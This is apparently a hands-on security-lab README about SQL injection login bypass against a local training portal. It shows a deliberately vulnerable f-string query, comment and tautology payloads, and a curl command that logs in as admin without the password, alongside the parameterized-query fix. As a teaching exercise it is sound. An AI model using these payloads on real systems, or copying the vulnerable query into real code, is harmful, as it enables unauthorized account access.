# sqli-auth-bypass

## Concepts

**SQL injection (SQLi)** happens when an application copies what a user typed directly into the text
of a database query. If the query is assembled from strings like that, the right input can rewrite
the **query itself**: a login check can be made to match every row, or the password comparison can
be cut off with a comment.

- **Why it matters.** One injectable login can hand over the whole application: sign in as any user
  with no password, read other people's data, sometimes modify or delete records. For more than ten years
  injection has ranked among the top entries of the OWASP Top 10, because it is both frequent and
  damaging.
- **How it works.** A vulnerable query is built like this:
  ```python
  query = f"SELECT * FROM users WHERE username = '{u}' AND password = '{p}'"
  ```
  The input lands inside the quotes. Two classic ways to abuse it:
  - **Comment** — send username `admin' --`. The query becomes
    `... WHERE username = 'admin' --' AND password = '...'`. The `--` starts a SQL comment, so the
    password check is ignored and the admin row comes back.
  - **Tautology** — send `' OR '1'='1`. The `WHERE` clause becomes always true, so a row is returned
    regardless of the credentials.
- **The fix** is to use **parameterized queries** (prepared statements). The query text and the values
  travel to the database apart — `db.execute(sql, (u, p))` — so a value can never alter the query.
  Escaping quotes by hand is not a reliable substitute.

This lab's app, the **Meridian Freight** staff portal, builds its `/login` query with an f-string,
exactly the pattern above. The `admin` password is random and never stored anywhere you can read, so
the only way into `admin` is injection.

## Tasks

Start the lab with `./lab up sqli-auth-bypass`, then open a shell: `./lab shell sqli-auth-bypass`.
The portal runs at `http://127.0.0.1:8080` inside the container — drive it with `curl`.

1. **Recon** — look at the login form and the request it sends:
   ```
   curl http://127.0.0.1:8080/
   ```
   It POSTs `username` and `password` to `/login`. A normal attempt:
   ```
   curl -s -d 'username=admin' -d 'password=guess' http://127.0.0.1:8080/login
   ```
   returns *Invalid credentials* — you don't know the password.
2. **Exploit** — log in as `admin` **without** the real password, using a comment or a tautology:
   ```
   curl -s --data-urlencode "username=admin' --" --data-urlencode 'password=x' \
     http://127.0.0.1:8080/login
   ```
   A *Welcome, admin* response means the password check was bypassed.
3. **Capture the flag** — a non-legitimate admin login makes the server write `/flag/solved`.
   Confirm it:
   ```
   cat /flag/solved
   ```
   If it's missing, your injection didn't actually log you in as admin — check your quoting and try a
   tautology instead.
4. **Record your findings** in `/root/answers.txt` (`PARAM`, `PAYLOAD`, `TECHNIQUE`).

Check your work from the host: `./lab check sqli-auth-bypass`.

<details>
<summary>Hints</summary>

- Use `--data-urlencode` with curl so the quotes and spaces in your payload survive.
- Comment style: username `admin' --` (note the space after `--`), password anything.
- Tautology style: put `' OR '1'='1` in **both** fields.
- A wrong, non-injected login returns HTTP 401; a bypass returns 200 with *Welcome, admin*.
- The flag names the account you bypassed — it should say `admin`.

</details>

## My notes

<!-- Screenshots: ./lab shot sqli-auth-bypass ~/Screenshots/<file>.png <name>, then link it as
     ![what it shows](screenshots/<name>.png). Prefer code blocks for terminal output. -->

## Related

- `reflected-xss` — the other half of client-vs-server web bugs: getting a script to run in a browser.
- `wazuh-web-attack-triage` — the blue-team side: spotting SQLi and other web attacks in the logs.
